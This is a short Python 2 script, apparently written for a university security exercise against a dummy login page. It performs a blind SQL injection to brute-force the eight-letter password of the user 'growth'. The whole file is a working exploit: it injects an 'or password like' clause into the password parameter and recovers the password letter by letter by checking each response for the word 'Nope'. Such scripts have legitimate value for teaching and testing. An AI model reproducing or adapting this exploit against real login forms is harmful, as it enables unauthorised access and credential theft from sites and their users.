# SQLInject
# Tue Mar 21 22:55:00 GMT 2017
# by Maks G <http://github.com/codemaks>
# Bruteforces a url login to find the password of user 'growth' by SQL injection
#
# The dummy site considers the server SQL table to have a 'password' column, 
# and passwords to be 8 (a-z) lowercase characters.

import urllib
guess = ''
for i in range(8):
    for j in range(26):
        letter = unichr(97 + j) #letter 'a' starts at 97
        url_considered = 'http://st223.dcs.kcl.ac.uk:8080/osc/growth.php' +\
        '?username=growth&password=somepassword%27or%20password%20like%27' +\
        guess + letter + '%25' #add to end: 'or password like'...%
        response = urllib.urlopen(url_considered)
        page = response.read()
        if 'Nope' not in page:
            guess = guess + letter
            break
    print guess # see guess so far..
print guess
